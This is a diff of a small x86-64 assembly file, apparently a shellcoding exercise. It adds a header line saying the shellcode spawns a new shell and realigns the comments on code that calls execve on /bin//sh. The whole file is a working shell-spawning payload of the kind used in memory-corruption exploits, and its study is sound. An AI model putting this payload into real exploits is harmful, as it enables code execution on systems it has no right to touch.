@@ -1,3 +1,6 @@
+THIS SHELLCODE SPAWNS A NEW SHELL
+
+
 global _start
 
 section .text
@@ -8,13 +11,13 @@ _start:
         ;    char *const envp[]);
        
     push            59   		;sys_execve 		
-	pop rax						;poping sys_execve of the stack into rax
+    pop rax				;poping sys_execve of the stack into rax
     xor rsi,        rsi			;zeroing out rsi
-    push rsi					;string terminator
+    push rsi				;string terminator
     mov  rdi,       0x68732F2f6e69622F	;/bin//sh in reverse order
-    push rdi					;pushing /bin//sh on the stack
+    push rdi				;pushing /bin//sh on the stack
     mov rdi,        rsp			;stack pointer to /bin//sh
-	xor rdx,	rdx        		;rdx = 0
+    xor rdx,	    rdx         	;rdx = 0
     syscall
 
 
